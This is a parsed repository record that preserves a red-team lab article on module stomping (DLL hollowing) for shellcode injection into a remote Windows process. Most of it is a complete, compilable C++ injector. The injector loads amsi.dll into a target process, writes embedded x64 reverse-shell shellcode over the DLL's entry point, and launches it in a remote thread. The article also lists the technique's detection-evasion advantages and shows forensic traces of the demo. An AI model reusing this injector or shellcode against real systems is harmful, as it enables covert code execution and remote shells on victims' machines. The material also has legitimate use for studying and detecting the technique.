---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Module Stomping for Shellcode Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-modulestomping-dll-hollowing-shellcode-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Module Stomping for Shellcode Injection](../../topics/offensive-security/module-stomping-for-shellcode-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-modulestomping-dll-hollowing-shellcode-injection |
| name | Module Stomping for Shellcode Injection |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection.md |

## Preserved Source Material

````yaml
_asset_filenames:
- adressofentrypointdllinjection (1).gif
- image (401).png
- image (404).png
_body: "---\ndescription: Code Injection\n---\n\n# Module Stomping for Shellcode Injection\n\n## Overview\n\nModule Stomping\
  \ (or Module Overloading or DLL Hollowing) is a shellcode injection (although can be used for injecting full DLLs) technique\
  \ that at a high level works as follows:\n\n1. Injects some benign Windows DLL into a remote (target) process\n2. Overwrites\
  \ DLL's, loaded in step 1, `AddressOfEntryPoint` point with shellcode\n3. Starts a new thread in the target process at the\
  \ benign DLL's entry point, where the shellcode has been written to, during step 2\n\nIn this lab, I will inject `amsi.dll`\
  \ into a `notepad.exe` process, but this of course could be done with any other DLL and process.\n\n## Pros\n\n1. Does not\
  \ allocate RWX memory pages or change their permissions in the target process at any point\n2. Shellcode is injected into\
  \ a legitimate Windows DLL, so detections looking for DLLs loaded from weird places like c:\\temp\\ would not work\n3. Remote\
  \ thread that executes the shellcode is associated with a legitimate Windows module\n\n## Cons\n\n`ReadProcessMemory`/`WriteProcessMemory`\
  \ API calls are usually used by debuggers rather than \"normal\" programs.\n\n{% hint style=\"info\" %}\n`ReadProcessMemory`\
  \ is used to read remote process injected module's image headers, meaning we could ditch the `ReadProcessMemory` call and\
  \ read those headers from the DLL on the disk.&#x20;\n\nWe could also use `NtMapViewOfSection` to inject shellcode into\
  \ the remote process, reducing the need for `WriteProcessMemory`.\n{% endhint %}\n\n## Code\n\n```cpp\n#include \"pch.h\"\
  \n#include <iostream>\n#include <Windows.h>\n#include <psapi.h>\n\nint main(int argc, char *argv[])\n{\n\tHANDLE processHandle;\n\
  \tPVOID remoteBuffer;\n\twchar_t moduleToInject[] = L\"C:\\\\windows\\\\system32\\\\amsi.dll\";\n\tHMODULE modules[256]\
  \ = {};\n\tSIZE_T modulesSize = sizeof(modules);\n\tDWORD modulesSizeNeeded = 0;\n\tDWORD moduleNameSize = 0;\n\tSIZE_T\
  \ modulesCount = 0;\n\tCHAR remoteModuleName[128] = {};\n\tHMODULE remoteModule = NULL;\n\n\t// simple reverse shell x64\n\
  \tunsigned char shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\\
  x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\\
  x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\\
  x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\\
  x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\\
  xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\\
  x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\\
  xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\\
  x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\\
  x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\\
  xbb\\x0a\\x00\\x00\\x05\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\\
  x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\\
  xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\\
  x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\\x48\\x81\\xc4\\x40\\x02\\x00\\x00\\x49\\xb8\\\
  x63\\x6d\\x64\\x00\\x00\\x00\\x00\\x00\\x41\\x50\\x41\\x50\\x48\\x89\\xe2\\x57\\x57\\x57\\x4d\\x31\\xc0\\x6a\\x0d\\x59\\\
  x41\\x50\\xe2\\xfc\\x66\\xc7\\x44\\x24\\x54\\x01\\x01\\x48\\x8d\\x44\\x24\\x18\\xc6\\x00\\x68\\x48\\x89\\xe6\\x56\\x50\\\
  x41\\x50\\x41\\x50\\x41\\x50\\x49\\xff\\xc0\\x41\\x50\\x49\\xff\\xc8\\x4d\\x89\\xc1\\x4c\\x89\\xc1\\x41\\xba\\x79\\xcc\\\
  x3f\\x86\\xff\\xd5\\x48\\x31\\xd2\\x48\\xff\\xca\\x8b\\x0e\\x41\\xba\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\\
  x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\\
  x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\";\n\n\t// inject a benign DLL into remote process\n\tprocessHandle\
  \ = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));\n\t//processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE,\
  \ 8444);\n\t\n\tremoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE);\n\
  \tWriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);\n\tPTHREAD_START_ROUTINE\
  \ threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(\"Kernel32\")), \"LoadLibraryW\");\n\tHANDLE\
  \ dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);\n\tWaitForSingleObject(dllThread,\
  \ 1000);\n\t\n\t// find base address of the injected benign DLL in remote process\n\tEnumProcessModules(processHandle, modules,\
  \ modulesSize, &modulesSizeNeeded);\n\tmodulesCount = modulesSizeNeeded / sizeof(HMODULE);\n\tfor (size_t i = 0; i < modulesCount;\
  \ i++)\n\t{\n\t\tremoteModule = modules[i];\n\t\tGetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));\n\
  \t\tif (std::string(remoteModuleName).compare(\"amsi.dll\") == 0) \n\t\t{\n\t\t\tstd::cout << remoteModuleName << \" at\
  \ \" << modules[i];\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// get DLL's AddressOfEntryPoint\n\tDWORD headerBufferSize = 0x1000;\n\
  \tLPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);\n\tReadProcessMemory(processHandle,\
  \ remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);\n\n\tPIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;\n\
  \tPIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);\n\tLPVOID\
  \ dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);\n\tstd::cout << \",\
  \ entryPoint at \" << dllEntryPoint;\n\n\t// write shellcode to DLL's AddressofEntryPoint\n\tWriteProcessMemory(processHandle,\
  \ dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);\n\t\n\t// execute shellcode from inside the benign DLL\n\t\
  CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);\n\t\n\treturn 0;\n}\n```\n\
  \n## Demo\n\nBelow shows the technique in action - amsi.dll gets loaded into notepad and a reverse shell is spawned by the\
  \ shellcode injected into amsi.dll `AddressOfEntryPoint`:\n\n![](<../../.gitbook/assets/adressofentrypointdllinjection (1).gif>)\n\
  \n## Observation\n\nNote how powershell window shows that `amsi.dll` is loaded at 00007FFF20E60000 and it's DLL `AddressOfEntryPoint`\
  \ point is at **00007FFF20E67**E00.&#x20;\n\nIf we look at the stack trace of the cmd.exe process creation event in procmon,\
  \ we see that frame 9 originates from inside `amsi!AmsiUacScan+0x5675` (**00007fff20e67**f95) before the code transitions\
  \ to kernelbase.dll where `CreateProcessA` is called:\n\n![](<../../.gitbook/assets/image (401).png>)\n\n{% file src=\"\
  ../../.gitbook/assets/addressofentrypoint-injection-procmon.PML\" %}\nProcmon logs\n{% endfile %}\n\nIf we inspect notepad.exe\
  \ threads, we can see thread 7372 with a start address of `Amsi!AmsiUacScan+0x54e0`.&#x20;\n\nIf we inspect that memory\
  \ location with a debugger, we see it resolves to `Amsi!DLLMainCRTStartup` and it contains our shellcode as expected:\n\n\
  ![](<../../.gitbook/assets/image (404).png>)\n\n## References\n\n{% embed url=\"https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing\"\
  \ %}\n\n{% embed url=\"http://williamknowles.io/living-dangerously-with-module-stomping-leveraging-code-coverage-analysis-for-injecting-into-legitimately-loaded-dlls/\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection.md
````
